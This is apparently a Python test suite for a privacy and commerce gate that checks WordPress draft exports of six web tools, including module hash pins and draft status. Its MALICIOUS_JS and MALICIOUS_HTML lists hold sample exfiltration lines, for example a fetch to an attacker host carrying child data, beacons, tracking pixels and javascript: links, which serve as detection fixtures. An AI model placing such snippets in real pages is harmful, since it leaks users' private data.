"""R189 isolated synthetic regression: 6 tools and 9 pinned JS modules."""
import importlib.util
from pathlib import Path
import json
import tempfile
import unittest

SRC = Path(__file__).resolve().parents[1]/'tools/r189_tool_privacy_and_commerce_gate.py'
spec = importlib.util.spec_from_file_location('r189', SRC)
r = importlib.util.module_from_spec(spec)
spec.loader.exec_module(r)


class Gate(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.addCleanup(self.temp.cleanup)
        self.prep = Path(self.temp.name)/'preparedness'
        for dirname in ('tools','content/tools','build/wp'):
            (self.prep/dirname).mkdir(parents=True)
        self.modules = {m: '/* local-only script '+m+' */\nvar '+m.split('.')[0]+' = true;\n'
                        for m in r.JS_PINS}
        self.pins = {}
        for name, content in self.modules.items():
            (self.prep/'tools'/name).write_text(content, encoding='utf-8')
            self.pins[name] = r.blob_sha(content.encode('utf-8'))
        for name, filenames in r.TOOLS.items():
            self.body(name, '<form onsubmit="return false" id="a"></form><script>\n' +
                      '\n'.join('{{inline-js:'+f+'}}' for f in filenames) + '\n</script>')
            (self.prep/'content/tools'/f'{name}.meta.json').write_text(json.dumps({
                'slug':name,'status':{'publish':'draft'}}), encoding='utf-8')
        self.render_all()

    def body(self, name, content):
        (self.prep/'content/tools'/f'{name}.body.html').write_text(content, encoding='utf-8')

    def module(self, filename, text, *, pin=True):
        (self.prep/'tools'/filename).write_text(text, encoding='utf-8')
        if pin:
            self.pins[filename] = r.blob_sha(text.encode('utf-8'))

    def render_all(self):
        for name, filenames in r.TOOLS.items():
            body = (self.prep/'content/tools'/f'{name}.body.html').read_text(encoding='utf-8')
            for fname in filenames:
                body = body.replace('{{inline-js:'+fname+'}}',
                    (self.prep/'tools'/fname).read_text(encoding='utf-8'))
            (self.prep/'build/wp'/f'{name}.html').write_text(
                '<!-- wp:html -->\n'+body+'\n<!-- /wp:html -->', encoding='utf-8')

    def run_gate(self, *, exports=True):
        return r.check(self.prep, self.pins, require_exports=exports)

    def assertHold(self):
        packet=self.run_gate()
        self.assertEqual(packet['state'], r.HOLD, packet['errors'])
        self.assertEqual(packet['errors'], [])
        self.assertEqual(packet['tools_checked'], 6)
        self.assertEqual(packet['wp_exports_checked'], 6)
        self.assertEqual(packet['js_producers_verified'], 9)
        self.assertIs(packet['merchant_offer_verified'], False)
        self.assertIs(packet['publication_authorized'], False)

    def test_native_builder_print_button_accepted_in_all_draft_exports(self):
        # Real build_article() adds two user-initiated print buttons to every
        # WordPress draft. A denylist rejecting them makes R189 fail even on
        # an otherwise authentic export. Preserve those exact harmless calls.
        button = '<button type="button" class="pa-btn pa-btn--ghost" onclick="window.print()">Print this guide</button>'
        for name in r.TOOLS:
            f = self.prep/'build/wp'/f'{name}.html'
            f.write_text(f.read_text().replace('</script>', '</script>'+button+button), encoding='utf-8')
        self.assertHold()

    def test_baseline(self):
        self.assertHold()

    def test_source_only_never_passes(self):
        pkt=self.run_gate(exports=False)
        self.assertEqual(pkt['state'],r.INVALID)
        self.assertEqual(pkt['wp_exports_checked'], 0)

    def test_missing_export(self):
        (self.prep/'build/wp/kit-builder.html').unlink()
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_broken_export_wrapper(self):
        f=self.prep/'build/wp/kit-builder.html'
        f.write_text(f.read_text().replace('<!-- wp:html -->', '<!-- wp:paragraph -->'))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_export_js_mutated(self):
        f=self.prep/'build/wp/kit-builder.html'
        f.write_text(f.read_text().replace('var kit_planner = true;', 'var kit_planner = false;'))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_unauthorized_approval(self):
        f=self.prep/'build/wp/kit-builder.html'
        f.write_text(f.read_text().replace('</script>','</script>data-verify="reviewed"'))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_wrong_source_module_hash(self):
        self.module('reunion_card.js', 'var changed=true;', pin=False)
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_source_js_symlink(self):
        f=self.prep/'tools/water_planner.js'
        f.unlink()
        f.symlink_to(self.prep/'tools/kit_planner.js')
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_missing_metadata(self):
        (self.prep/'content/tools/kit-builder.meta.json').unlink()
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_metadata_false_published(self):
        f=self.prep/'content/tools/kit-builder.meta.json'
        f.write_text(json.dumps({'slug':'kit-builder','status':{'publish':'published'}}))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_unknown_module(self):
        p=self.prep/'content/tools/kit-builder.body.html'
        p.write_text(p.read_text().replace('kit_planner_ui.js','evil.js'))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_unresolved_duplicate_js(self):
        p=self.prep/'content/tools/kit-builder.body.html'
        p.write_text(p.read_text().replace('</script>', '{{inline-js:kit_planner.js}}</script>'))
        self.assertEqual(self.run_gate()['state'],r.INVALID)

    def test_custom_roster_rejected(self):
        bad=dict(self.pins)
        bad.pop('kit_planner.js')
        self.assertEqual(r.check(self.prep,bad)['state'],r.INVALID)

    def test_bad_url_rejects_affiliate_hosts(self):
        self.assertTrue(r.bad_url('https://example.payhip.com/b/abc'))
        self.assertTrue(r.bad_url('https://something.com/free?affiliate=x'))
        self.assertFalse(r.bad_url('https://www.ready.gov/plan'))

    def test_source_surface_form_safety(self):
        self.assertEqual(r.Surface().errors, [])
        parser=r.Surface();parser.feed('<form action="https://unknown.com" onsubmit="return false"></form>')
        self.assertTrue(parser.errors)

    def test_main_never_exit_zero(self):
        self.assertEqual(r.main(['--repo',self.temp.name,'--source-only']),2)

    def test_no_public_safety_claims(self):
        x=self.run_gate()
        self.assertIs(x['privacy_browser_qa_complete'],False)
        self.assertIs(x['qualified_safety_review_complete'],False)
        self.assertIsNone(x['verified_paid_orders'])


MALICIOUS_JS = [
 'fetch("https://attacker.test?child="+x);',
 'new XMLHttpRequest();', 'navigator.sendBeacon("https://example.com", x);',
 'new WebSocket("wss://example.com");', 'new EventSource("https://example.com");',
 'localStorage.setItem("child",x);', 'sessionStorage.setItem("kid",x);',
 'indexedDB.open("private");', 'document.cookie="school="+x;',
 'cookieStore.set("child",x);', 'window["fetch"]("https://ex.test");',
 'self["sendBeacon"]("https://ex.test");', 'postMessage(x,"*");',
 'new RTCPeerConnection();', 'window.open("https://example.com");',
 'location.href="https://ex.test?phone="+x;',
 'location.assign("https://ex.test");', 'new Image().src="https://ex.test";',
 'document.write("<img src=https://ex.test>");', 'importScripts("https://ex.test/js");',
 'navigator.serviceWorker.register("/sw.js");', 'eval("alert(1)");',
 'new Function("return 1");', 'tag.setAttribute("src","https://ex.test");',
 'tag.src="https://ex.test";',
]
MALICIOUS_HTML = [
 '<form action="https://ex.test">', '<form method="post">',
 '<form onsubmit="send()">', '<iframe src="/other"></iframe>',
 '<script src="https://ex.test/lib.js"></script>',
 '<img src="https://ex.test/pixel.png">', '<link rel="stylesheet" href="https://ex.test">',
 '<meta http-equiv="refresh" content="0;url=https://ex.test">',
 '<a href="https://payhip.com/b/other">Shop</a>',
 '<a href="https://awin1.com/cread.php">Go</a>',
 '<a rel="sponsored" href="https://safe.test">Go</a>',
 '<a href="javascript:alert(1)">Go</a>',
 '<a href="//unknown.test">Go</a>',
 '<button onclick="send()">Go</button>',
 '<form enctype="multipart/form-data" onsubmit="return false">',
 # Exact native-builder print control is allowed, never a generic onclick pass.
 '<button type="button" class="pa-btn pa-btn--ghost" onclick="window.print();fetch(1)">Print</button>',
 '<button type="button" class="pa-btn pa-btn--ghost" onclick="alert(1)">Print</button>',
 '<button type="submit" class="pa-btn pa-btn--ghost" onclick="window.print()">Print</button>',
 '<button type="button" class="pa-btn pa-btn--other" onclick="window.print()">Print</button>',
 '<a type="button" class="pa-btn pa-btn--ghost" onclick="window.print()">Print</a>',
 '<button type="button" class="pa-btn pa-btn--ghost" onclick="window.print()" onmouseover="exfil()">Print</button>',
 '<button type="button" class="pa-btn pa-btn--ghost" onclick="window.print();">Print</button>',
]


def js_case(index, fragment):
    def check(self):
        self.module('kit_planner.js', self.modules['kit_planner.js']+'\n'+fragment)
        self.render_all()
        packet=self.run_gate()
        self.assertEqual(packet['state'],r.INVALID,fragment)
        self.assertTrue(packet['errors'])
    check.__name__='test_js_privacy_'+str(index)
    return check


def html_case(index, fragment):
    def check(self):
        name='water-planner'
        f=self.prep/'content/tools'/f'{name}.body.html'
        f.write_text(f.read_text().replace('</script>', '</script>'+fragment))
        self.render_all()
        packet=self.run_gate()
        self.assertEqual(packet['state'],r.INVALID,fragment)
    check.__name__='test_html_boundary_'+str(index)
    return check

for i, src in enumerate(MALICIOUS_JS):
    setattr(Gate, f'test_js_privacy_{i:02d}', js_case(i,src))
for i, src in enumerate(MALICIOUS_HTML):
    setattr(Gate, f'test_html_boundary_{i:02d}', html_case(i,src))


if __name__ == '__main__':
    unittest.main()
